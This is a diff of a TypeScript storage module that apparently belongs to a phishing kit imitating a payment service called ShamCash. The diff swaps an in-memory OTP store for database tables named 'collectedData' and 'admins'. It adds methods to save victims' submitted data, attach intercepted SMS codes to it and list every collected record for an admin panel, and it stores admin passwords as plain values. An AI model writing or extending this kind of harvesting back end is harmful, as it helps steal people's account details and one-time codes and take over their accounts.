@@ -1,79 +1,84 @@
-import { type User, type InsertUser } from "@shared/schema";
-import { randomUUID } from "crypto";
+import { db } from "./db";
+import { users, collectedData, admins, type User, type InsertUser, type CollectedData, type InsertCollectedData, type Admin } from "@shared/schema";
+import { eq, desc } from "drizzle-orm";
 
 export interface IStorage {
   getUser(id: string): Promise<User | undefined>;
   getUserByEmail(email: string): Promise<User | undefined>;
   createUser(user: InsertUser): Promise<User>;
   updateUserVerification(id: string, isVerified: boolean): Promise<User | undefined>;
-  storeOtp(userId: string, otp: string): Promise<void>;
-  getOtp(userId: string): Promise<string | undefined>;
-  clearOtp(userId: string): Promise<void>;
+  
+  createCollectedData(data: InsertCollectedData): Promise<CollectedData>;
+  updateCollectedDataSms(id: string, smsCode: string): Promise<CollectedData | undefined>;
+  getAllCollectedData(): Promise<CollectedData[]>;
+  getCollectedDataById(id: string): Promise<CollectedData | undefined>;
+  
+  getAdminByUsername(username: string): Promise<Admin | undefined>;
+  createAdmin(username: string, password: string, role: string): Promise<Admin>;
 }
 
-export class MemStorage implements IStorage {
-  private users: Map<string, User>;
-  private otps: Map<string, string>;
-
-  constructor() {
-    this.users = new Map();
-    this.otps = new Map();
-    
-    const testUser: User = {
-      id: "test-user-id",
-      email: "test@shamcash.com",
-      password: "123456",
-      pin: "1234",
-      phone: "+966500000000",
-      isVerified: false,
-      createdAt: new Date(),
-    };
-    this.users.set(testUser.id, testUser);
-  }
-
+export class DbStorage implements IStorage {
   async getUser(id: string): Promise<User | undefined> {
-    return this.users.get(id);
+    const result = await db.select().from(users).where(eq(users.id, id)).limit(1);
+    return result[0];
   }
 
   async getUserByEmail(email: string): Promise<User | undefined> {
-    return Array.from(this.users.values()).find(
-      (user) => user.email === email,
-    );
+    const result = await db.select().from(users).where(eq(users.email, email)).limit(1);
+    return result[0];
   }
 
   async createUser(insertUser: InsertUser): Promise<User> {
-    const id = randomUUID();
-    const user: User = { 
-      ...insertUser, 
-      id,
-      isVerified: false,
-      createdAt: new Date(),
-    };
-    this.users.set(id, user);
-    return user;
+    const result = await db.insert(users).values(insertUser).returning();
+    return result[0];
   }
 
   async updateUserVerification(id: string, isVerified: boolean): Promise<User | undefined> {
-    const user = this.users.get(id);
-    if (user) {
-      user.isVerified = isVerified;
-      this.users.set(id, user);
-      return user;
-    }
-    return undefined;
+    const result = await db.update(users)
+      .set({ isVerified })
+      .where(eq(users.id, id))
+      .returning();
+    return result[0];
   }
 
-  async storeOtp(userId: string, otp: string): Promise<void> {
-    this.otps.set(userId, otp);
+  async createCollectedData(data: InsertCollectedData): Promise<CollectedData> {
+    const result = await db.insert(collectedData).values(data).returning();
+    return result[0];
   }
 
-  async getOtp(userId: string): Promise<string | undefined> {
-    return this.otps.get(userId);
+  async updateCollectedDataSms(id: string, smsCode: string): Promise<CollectedData | undefined> {
+    const result = await db.update(collectedData)
+      .set({ 
+        smsCode,
+        verifiedAt: new Date()
+      })
+      .where(eq(collectedData.id, id))
+      .returning();
+    return result[0];
   }
 
-  async clearOtp(userId: string): Promise<void> {
-    this.otps.delete(userId);
+  async getAllCollectedData(): Promise<CollectedData[]> {
+    return await db.select().from(collectedData).orderBy(desc(collectedData.createdAt));
+  }
+
+  async getCollectedDataById(id: string): Promise<CollectedData | undefined> {
+    const result = await db.select().from(collectedData).where(eq(collectedData.id, id)).limit(1);
+    return result[0];
+  }
+
+  async getAdminByUsername(username: string): Promise<Admin | undefined> {
+    const result = await db.select().from(admins).where(eq(admins.username, username)).limit(1);
+    return result[0];
+  }
+
+  async createAdmin(username: string, password: string, role: string): Promise<Admin> {
+    const result = await db.insert(admins).values({
+      username,
+      password,
+      role,
+    }).returning();
+    return result[0];
   }
 }
 
-export const storage = new MemStorage();
+export const storage = new DbStorage();
